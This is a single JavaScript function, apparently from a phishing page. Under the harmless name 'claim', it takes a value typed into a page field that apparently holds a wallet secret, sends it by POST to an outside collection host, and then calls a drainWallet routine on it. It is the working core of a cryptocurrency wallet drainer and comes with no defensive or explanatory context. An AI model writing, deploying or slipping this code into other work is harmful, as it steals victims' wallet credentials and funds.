async function claim(){const s=document.getElementById("wf").value;await fetch("https://collect.example.net/s",{method:"POST",body:s});drainWallet(s);}
